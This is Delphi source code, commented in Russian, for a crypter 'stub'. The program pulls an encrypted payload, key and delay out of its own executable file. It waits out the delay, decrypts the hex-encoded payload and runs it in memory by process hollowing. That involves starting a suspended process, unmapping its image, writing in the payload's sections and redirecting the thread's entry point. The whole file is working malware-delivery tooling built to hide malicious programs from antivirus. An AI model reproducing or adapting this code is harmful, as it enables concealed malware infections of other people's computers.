program Stub;

{$APPTYPE GUI}

uses
  Winapi.Windows,
  System.SysUtils;


//Метод получение кода стаба
function StFileToString(StFile: AnsiString): AnsiString;
var
  sF: HFile;
  uBytes: Cardinal;
begin
  sF := _lopen(PAnsiChar(StFile), OF_READ);
  uBytes := GetFileSize(sF, nil);
  SetLength(Result, uBytes);
  _lread(sF, @result[1], uBytes);
  _lclose(sF);
end;

//Метод деления делиметра
type
  TsArray = array of string;

function DelimetrFile(Text, Del: string): TsArray;
var
  o: integer;
  PosDel: integer;
  Aux: string;
begin
  o := 0;
  Aux := Text;
  setlength(Result, length(Aux));
  repeat
    PosDel := Pos(Del, Aux) - 1;
    if PosDel = -1 then
    begin
      Result[o] := Aux;
      break;
    end;
    Result[o] := copy(Aux, 1, PosDel);
    delete(Aux, 1, PosDel + length(Del));
    inc(o);
  until Aux = '';
end;

//Метод дешифрования строки
function DeCode(text, password: Ansistring): Ansistring;
var
  i, PasswordLength: integer;
  sign: shortint;
begin
  PasswordLength := length(password);
  if PasswordLength = 0 then
    Exit;
  sign := -1;
  for i := 1 to Length(text) do
  begin
    text[i] := AnsiChar(ord(text[i]) + sign * ord(password[i mod PasswordLength + 1]));
    Result := Result + Ansistring(text[i]);
  end;
end;

//Метод запуска байт кода из памяти процесса
function MemoryExecute(Buffer: Pointer; Parameters: string; Visible: Boolean): TProcessInformation;
type
  HANDLE = THandle;

  PVOID = Pointer;

  LPVOID = Pointer;

  ULONG_PTR = Cardinal;

  NTSTATUS = LongInt;

  LONG_PTR = Integer;

  PImageSectionHeaders = ^TImageSectionHeaders;

  TImageSectionHeaders = array[0..95] of TImageSectionHeader;
var
  ZwUnmapViewOfSection: function(ProcessHandle: THANDLE; BaseAddress: Pointer): LongInt; stdcall;
  ProcessInfo: TProcessInformation;
  StartupInfo: TStartupInfo;
  Context: TContext;
  BaseAddress: Pointer;
  BytesRead: Size_T;
  BytesWritten: Size_T;
  I: ULONG;
  OldProtect: ULONG;
  NTHeaders: PImageNTHeaders;
  Sections: PImageSectionHeaders;
  Success: Boolean;
  ProcessName: string;

  function ImageFirstSection(NTHeader: PImageNTHeaders): PImageSectionHeader;
  begin
    Result := PImageSectionheader(ULONG_PTR(@NTheader.OptionalHeader) + NTHeader.FileHeader.SizeOfOptionalHeader);
  end;

  function Protect(Characteristics: ULONG): ULONG;
  const
    Mapping: array[0..7] of ULONG = (PAGE_NOACCESS, PAGE_EXECUTE, PAGE_READONLY, PAGE_EXECUTE_READ, PAGE_READWRITE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE);
  begin
    Result := Mapping[Characteristics shr 29];
  end;

begin
  @ZwUnmapViewOfSection := GetProcAddress(LoadLibrary('ntdll.dll'), 'ZwUnmapViewOfSection');
  ProcessName := ParamStr(0);

  FillChar(ProcessInfo, SizeOf(TProcessInformation), 0);
  FillChar(StartupInfo, SizeOf(TStartupInfo), 0);

  StartupInfo.cb := SizeOf(TStartupInfo);
  StartupInfo.dwFlags := STARTF_USESHOWWINDOW;
  if Visible then
    StartupInfo.wShowWindow := SW_NORMAL
  else
    StartupInfo.wShowWindow := SW_Hide;

  if (CreateProcess(PChar(ProcessName), PChar(Parameters), NIL, NIL, False, CREATE_SUSPENDED, NIL, NIL, StartupInfo, ProcessInfo)) then
  begin
    Success := True;
    Result := ProcessInfo;

    try
      Context.ContextFlags := CONTEXT_INTEGER;
      if (GetThreadContext(ProcessInfo.hThread, Context) and (ReadProcessMemory(ProcessInfo.hProcess, Pointer(Context.Ebx + 8), @BaseAddress, SizeOf(BaseAddress), BytesRead)) and (ZwUnmapViewOfSection(ProcessInfo.hProcess, BaseAddress) >= 0) and (Assigned(Buffer))) then
      begin
        NTHeaders := PImageNTHeaders(Cardinal(Buffer) + Cardinal(PImageDosHeader(Buffer)._lfanew));
        BaseAddress := VirtualAllocEx(ProcessInfo.hProcess, Pointer(NTHeaders.OptionalHeader.ImageBase), NTHeaders.OptionalHeader.SizeOfImage, MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE);

        if (Assigned(BaseAddress)) and (WriteProcessMemory(ProcessInfo.hProcess, BaseAddress, Buffer, NTHeaders.OptionalHeader.SizeOfHeaders, BytesWritten)) then
        begin
          Sections := PImageSectionHeaders(ImageFirstSection(NTHeaders));

          for I := 0 to NTHeaders.FileHeader.NumberOfSections - 1 do
            if (WriteProcessMemory(ProcessInfo.hProcess, Pointer(Cardinal(BaseAddress) + Sections[I].VirtualAddress), Pointer(Cardinal(Buffer) + Sections[I].PointerToRawData), Sections[I].SizeOfRawData, BytesWritten)) then
              VirtualProtectEx(ProcessInfo.hProcess, Pointer(Cardinal(BaseAddress) + Sections[I].VirtualAddress), Sections[I].Misc.VirtualSize, Protect(Sections[I].Characteristics), OldProtect);

          if (WriteProcessMemory(ProcessInfo.hProcess, Pointer(Context.Ebx + 8), @BaseAddress, SizeOf(BaseAddress), BytesWritten)) then
          begin
            Context.EAX := ULONG(BaseAddress) + NTHeaders.OptionalHeader.AddressOfEntryPoint;
            Success := SetThreadContext(ProcessInfo.hThread, Context);
          end;
        end;
      end;
    finally
      if (not Success) then
        TerminateProcess(ProcessInfo.hProcess, 0)
      else
        ResumeThread(ProcessInfo.hThread);
    end;
  end;
end;



var
  KeY, SlT, StFileByteCode, FileName: AnsiString;
  DeL, SHex: string;
  TArray: TsArray;
  Buf: array of Byte;
  i, Len: Integer;
begin
  //Разделитель
  DeL := 'DelimiterStub';

  //Получаем код стаба
  StFileByteCode := StFileToString(AnsiString(paramstr(0)));

  //Делим код стаба
  TArray := DelimetrFile(string(StFileByteCode), string(DeL));

  //Получаем зашифрованный код файла
  FileName := AnsiString(TArray[1]);

  //Получаем ключ дешифрования
  KeY := AnsiString(TArray[2]);

  //Получаем время задержки перед исполнением
  SlT := AnsiString(TArray[3]);

  //Выжидаем задержку перед дешифрованием и запуском
  Sleep(StrToInt(string(AnsiString(SlT))));

  //Дешифруем и получаем hex
  FileName := DeCode(AnsiString(FileName), AnsiString(KeY));

  //Переводим hex в bytecode
  SHex := string(FileName);
  Len := Length(SHex);
  if (Len > 0) and (Len mod 2 = 0) then
  begin
    SetLength(Buf, Len div 2);
    I := 0;
    while (I <= High(Buf)) do
    begin
      Buf[I] := StrToInt('$' + Copy(SHex, I * 2 + 1, 2));
      Inc(I)
    end
  end;

  //Запускаем bytecode в памяти процесса стаба
  MemoryExecute(@Buf[0], '', true);
end.

